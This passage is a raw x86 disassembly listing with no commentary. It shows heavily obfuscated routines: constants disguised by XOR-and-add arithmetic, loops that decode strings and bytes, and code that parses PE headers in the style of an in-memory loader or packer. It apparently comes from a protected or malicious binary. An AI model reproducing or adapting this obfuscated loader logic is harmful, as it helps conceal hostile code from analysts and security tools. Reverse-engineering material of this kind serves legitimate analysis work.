  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
